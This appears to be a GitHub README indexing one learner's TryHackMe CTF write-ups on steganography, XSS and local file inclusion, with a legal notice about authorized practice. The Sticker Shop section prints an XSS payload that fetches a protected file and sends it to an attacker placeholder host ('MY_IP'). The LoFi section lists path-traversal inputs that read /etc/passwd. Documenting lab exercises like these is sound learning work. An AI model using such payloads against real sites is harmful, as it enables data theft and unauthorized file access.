# 🧠 CyberSec Writeups & Solutions by Achref Rahali

Welcome to my personal repository of cybersecurity challenges, cracking problems, and hacking labs that I’ve tackled and documented. This repo serves as a logbook of my progress through CTFs, TryHackMe rooms, and real-world scenarios to sharpen my offensive security skills.

---

## 🧠 Solved Challenges
### 📌 [CyberLens – TryHackMe](https://medium.com/@rahaliashraf732/cyberlens-tryhackme-writeup-d184903e497e)
A walkthrough of the CyberLens room on TryHackMe where I tackled:
- OSINT
- Steganography
- Network forensics
- Basic RE

> 📝 [Read full write-up on Medium](https://medium.com/@rahaliashraf732/cyberlens-tryhackme-writeup-d184903e497e)
[![Read on Medium](https://img.shields.io/badge/Read_on-Medium-black?logo=medium)](https://medium.com/@rahaliashraf732/cyberlens-tryhackme-writeup-d184903e497e)

📌 **Topics covered:**
- OSINT & Recon
- Steganography
- Network Forensics
- Reverse Engineering

📝 **Tools used:**
- Wireshark
- strings
- stegseek
- exiftool
- and more...

  🛡️ **Lessons Learned:**
- [x] Always enumerate all provided media and files — hidden messages are common in CTFs.
- [x] Metadata and file formats can reveal more than expected (e.g., EXIF, hidden ZIPs).
- [x] Don't skip packet analysis — the answer is often buried in plain sight within the pcap.
- [x] Automation tools like `stegseek` or `binwalk` can save massive time when exploring binary data.

---

### 📌 [The Sticker Shop – TryHackMe](https://medium.com/@rahaliashraf732/the-sticker-shop-046f5b9bec95)
An XSS-based exploitation of a vulnerable feedback form to exfiltrate a protected flag from the webserver.

> 📝 [Read full write-up on Medium](https://medium.com/@rahaliashraf732/the-sticker-shop-046f5b9bec95)  
[![Read on Medium](https://img.shields.io/badge/Read_on-Medium-black?logo=medium)](https://medium.com/@rahaliashraf732/the-sticker-shop-046f5b9bec95)

📌 **Topics covered:**
- XSS (Cross-Site Scripting)
- Access Control Bypass
- Same-Origin Policy (SOP) Exploitation
- JavaScript Payload Crafting

🛠️ **Exploitation Steps:**
1. Recon with `nmap` and `gobuster` to discover exposed HTTP service and directories.
2. Identified XSS via the feedback form using a `<script>alert(1)</script>` test.
3. Injected payload to fetch `/flag.txt` and leak it to a remote listener.
4. Captured the flag using a Python HTTP server.
5. Decoded exfiltrated content: `THM{83789a69074f636f64a38879cfcabe8b62305ee6}`

🧪 **Payload Used:**
```html
<script>
  fetch('/flag.txt')
    .then(r => r.text())
    .then(data => {
      window.location = 'http://MY_IP:8081/receive?flag=' + encodeURIComponent(data);
    });
</script>
```

🛡️ **Lessons Learned:**

- [x] Input sanitization is critical.
- [x] Same-Origin Policy can be abused if proper authentication isn’t enforced.
- [x] Feedback forms are common entry points for reflected XSS.

---

### 📌 LoFi Room – TryHackMe

An LFI-based exploitation of a vulnerable `?page=` parameter to access sensitive files on the system and retrieve the flag.

📝 [Read full write-up on Medium](https://medium.com/@rahaliashraf732/tryhackme-lofi-room-writeup-exploiting-lfi-vulnerability-ca349aec9d17)  
[![Read on Medium](https://img.shields.io/badge/Read_on-Medium-black?logo=medium)](https://medium.com/@rahaliashraf732/tryhackme-lofi-room-writeup-exploiting-lfi-vulnerability-ca349aec9d17)

---

#### 📌 Topics covered:
- Local File Inclusion (LFI)
- Directory Traversal
- Web Enumeration
- Flag Extraction

---

#### 🛠️ Exploitation Steps:
- Ran `nmap` to identify open ports (SSH & HTTP).
- Used `gobuster` to enumerate hidden directories (no useful results).
- Identified dynamic file inclusion through `?page=chill.php`.
- Tested LFI with `?page=../../../../etc/passwd` → success.
- Retrieved the flag via `?page=../../../../flag.txt`.

---

#### 🧪 Payload Used:
-?page=../../../../etc/passwd
-?page=../../../../flag.txt

---

#### 🛡️ Lessons Learned:
- Always check URL parameters for possible LFI.
- Directory traversal is a simple yet powerful technique.
- LFI can expose critical system files and sensitive information if unvalidated.

---

## 🔜 Coming Soon

I’ll be adding more CTF rooms, reverse engineering challenges, and crackmes, such as:
- VulnHub boxes
- Hack The Box writeups
- Custom malware analysis tasks
- Password cracking scenarios

---

## 📚 Why This Repo?

This repo helps me:
- Track my learning in infosec
- Improve my documentation skills
- Share my knowledge with others starting out in ethical hacking

---

## ⚠️ Legal Notice

> This repository is strictly for educational purposes. All challenges and techniques are practiced on **legally authorized platforms** like TryHackMe, HTB, or offline VMs. Do not attempt to use these techniques on unauthorized systems.

---


